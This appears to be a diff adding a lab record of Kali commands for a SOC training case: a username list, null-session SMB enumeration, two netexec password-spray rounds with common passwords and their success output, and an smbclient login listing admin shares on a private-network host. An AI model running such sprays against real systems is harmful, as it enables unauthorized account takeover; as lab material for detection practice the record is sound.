@@ -1,0 +1,35 @@
+# Kali commands — SOC-Case-Password-Spraying (192.168.100.106 -> 192.168.100.108)
+# Actual commands run. Attack window: 2026-10-27 ~23:30-23:32 UTC+8.
+
+# users.txt (spray list)
+dwilliams
+asmth
+lgarcia
+rtan
+okim
+mflores
+jdoe
+mreyes
+adminlab
+administrator
+guest
+
+# Enumeration
+netexec smb 192.168.100.108 -u '' -p '' --shares
+
+# Spray Round 1 — one password across ALL users (stays under lockout threshold)
+netexec smb 192.168.100.108 -u users.txt -p 'Winter2024!'
+#   [+] DESKTOP-F0JVTQT\dwilliams:Winter2024!   (success)
+
+# (delay — low and slow)
+
+# Spray Round 2 — second password across ALL users
+netexec smb 192.168.100.108 -u users.txt -p 'Password1'
+#   [+] DESKTOP-F0JVTQT\jdoe:Password1          (success — reused weak password)
+#   all others STATUS_LOGON_FAILURE; NO ACCOUNT_LOCKED_OUT
+
+# Verify compromised access
+smbclient -L //192.168.100.108 -U dwilliams%Winter2024!
+#   ADMIN$, C$, IPC$ listed
+
+date   # record time for timeline
